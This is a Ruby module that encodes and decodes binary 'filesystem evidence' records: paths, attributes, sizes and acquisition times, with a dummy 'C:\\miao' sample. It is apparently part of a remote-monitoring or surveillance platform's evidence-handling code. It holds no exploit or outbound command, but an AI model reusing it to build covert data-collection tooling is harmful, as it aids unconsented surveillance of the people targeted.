require 'rcs-common/evidence/common'

module RCS

module FilesystemEvidence

  FILESYSTEM_VERSION = 2010031501
  FILESYSTEM_IS_FILE = 0
	FILESYSTEM_IS_DIRECTORY = 1
	FILESYSTEM_IS_EMPTY     = 2

  def content
    path = "C:\\miao".to_utf16le_binary_null
    content = StringIO.new
    content.write [FILESYSTEM_VERSION, path.bytesize, FILESYSTEM_IS_FILE, 0, 0].pack("I*")
    content.write Time.now.getutc.to_filetime.pack('L*')
    content.write path

    content.string
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new
    until stream.eof?

      version, path_len, attribute, size_hi, size_lo = stream.read(20).unpack("I*")
      raise EvidenceDeserializeError.new("invalid log version for FILESYSTEM") unless version == FILESYSTEM_VERSION

      @info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))
      @info[:data][:path] = ''

      path = stream.read_utf16le_string
      @info[:data][:path] = path.utf16le_to_utf8 unless path.nil?
      @info[:data][:size] = size_hi << 32 | size_lo
      @info[:data][:attr] = attribute
      
      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end
    
    return evidences
  end
end

end # ::RCS